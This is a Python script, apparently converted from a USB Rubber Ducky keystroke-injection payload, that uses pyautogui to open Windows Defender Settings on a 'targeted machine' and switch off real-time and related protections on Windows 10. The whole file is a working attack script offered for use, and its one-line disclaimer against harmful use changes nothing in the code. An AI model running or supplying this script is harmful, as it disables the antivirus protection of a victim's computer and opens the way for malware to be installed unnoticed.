# Converted using ducky2python by CedArctic (https://github.com/CedArctic/ducky2python) 
import pyautogui
import time
# Author : https://github.com/TheTeasel
# Description : Disable Windows Defender on Windows 10
# : You may want to change the DELAY depending on the speed of the targeted machine
# PLEASE DO NOT USE THIS SCRIPT FOR HARMFUL PURPOSES
time.sleep(1)
# Open Windows Defender settings
pyautogui.hotkey("ctrl","esc")
time.sleep(2)
pyautogui.typewrite("Windows Defender Settings", interval=0.02)
time.sleep(0.1)
pyautogui.hotkey("enter")
# Navigate to realtime protection and disable it
time.sleep(5)
pyautogui.hotkey("enter")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("tab")
pyautogui.hotkey("enter")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("space")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("space")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("space")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("space")
time.sleep(2)
pyautogui.hotkey("tab")
time.sleep(2)
pyautogui.hotkey("space")
time.sleep(2)
pyautogui.hotkey("left")
time.sleep(0.5)
pyautogui.hotkey("enter")
# Close Settings
time.sleep(0.5)
pyautogui.hotkey("alt","f4")
time.sleep(0.1)
pyautogui.hotkey("alt","f4")
